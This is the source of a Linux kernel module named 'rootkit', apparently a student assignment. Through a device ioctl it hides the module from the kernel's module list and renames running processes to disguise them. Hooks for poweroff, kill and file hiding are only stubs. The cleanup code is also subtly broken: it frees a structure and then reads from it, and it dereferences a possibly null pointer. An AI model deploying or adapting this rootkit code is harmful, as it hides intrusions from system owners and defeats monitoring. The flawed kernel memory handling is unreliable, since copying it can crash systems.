#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("R12922072");
MODULE_DESCRIPTION("R12922072");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
static struct list_head *modules_head;

static int rootkit_open(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static int masq_module(unsigned long arg)
{
	int ret = 0;
	int n, i;
	struct masq_proc_req *req;
	struct masq_proc_req __user *usr_req;
	struct task_struct *p;

	n = sizeof(struct masq_proc_req);
	req = kmalloc(n, GFP_KERNEL);
	usr_req = (struct masq_proc_req *)arg;
	if (!req) {
		ret = -ENOMEM;
		goto masq_break;
	}
	if (copy_from_user(req, usr_req, n)) {
		ret = -EFAULT;
		goto masq_break;
	}

	n = req->len * sizeof(struct masq_proc);
	req->list = kmalloc(n, GFP_KERNEL);
	if (!req->list) {
		ret = -ENOMEM;
		goto masq_break;
	}
	if (copy_from_user(req->list, usr_req->list, n)) {
		ret = -EFAULT;
		goto masq_break;
	}

	for (i = 0; i < req->len; i++) {
		char *orig_name, *new_name;
		int orig_len, new_len;
		orig_name = req->list[i].orig_name;
		new_name = req->list[i].new_name;
		orig_len = strlen(orig_name);
		new_len = strlen(new_name);
		if (new_len >= orig_len)
			continue;
		for_each_process(p)
			if (strncmp(p->comm, orig_name, orig_len) == 0)
				strncpy(p->comm, new_name, sizeof(p->comm));
	}
masq_break:
	if (req)
		kfree(req);
	if (req->list)
		kfree(req->list);
	return ret;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	int ret = 0;
	pr_info("%s\n", __func__);

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		// hook poweroff: kernel/reboot.c
		// hook kill: kernel/signal.c: kill
		break;
	case IOCTL_MOD_HIDE:
		if (THIS_MODULE->list.next || THIS_MODULE->list.prev) {
			list_del_rcu(&THIS_MODULE->list);
			THIS_MODULE->list.next = THIS_MODULE->list.prev = NULL;
		} else
			list_add_rcu(&THIS_MODULE->list, modules_head);
		break;
	case IOCTL_MOD_MASQ:
		ret = masq_module(arg);
		break;
	case IOCTL_FILE_HIDE:
		break;
	default:
		ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	modules_head = THIS_MODULE->list.prev;

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: recover the syscall table when hooking the syscalls

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
